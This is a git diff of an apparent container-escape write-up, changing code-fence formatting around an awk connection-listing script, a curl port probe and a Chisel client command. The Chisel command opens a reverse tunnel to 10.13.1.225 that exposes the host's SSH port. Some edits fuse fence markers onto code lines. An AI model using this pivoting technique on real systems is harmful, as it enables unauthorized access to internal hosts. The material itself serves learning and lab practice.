@@ -29,8 +29,7 @@ The Docker container I landed in was lacking a lot core networking utils like `p
 
 I use their `awk` script:
 
-```bash
-{% raw %}
+```bash{% raw %}
 awk 'function hextodec(str,ret,n,i,k,c){
     ret = 0
     n = length(str)
@@ -49,8 +48,7 @@ function getIP(str,ret){
     ret = ret":"hextodec(substr(str,index(str,":")+1,4))
     return ret
 } 
-NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp
-{% endraw %}
+NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp{% endraw %}
 ```
 
 to see the current open TCP connections. 
@@ -66,9 +64,7 @@ curl -m 1 --include -v localhost:$x
 
 After identifying an open port 22 on the host machine, I download [Chisel](https://github.com/jpillora/chisel) onto the docker container and launch the client command: 
 
-```bash
-
-$ ./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
+```bash$ ./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
 2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
 2021/09/13 21:35:00 client: Connected (Latency 184.290108ms)
 ```
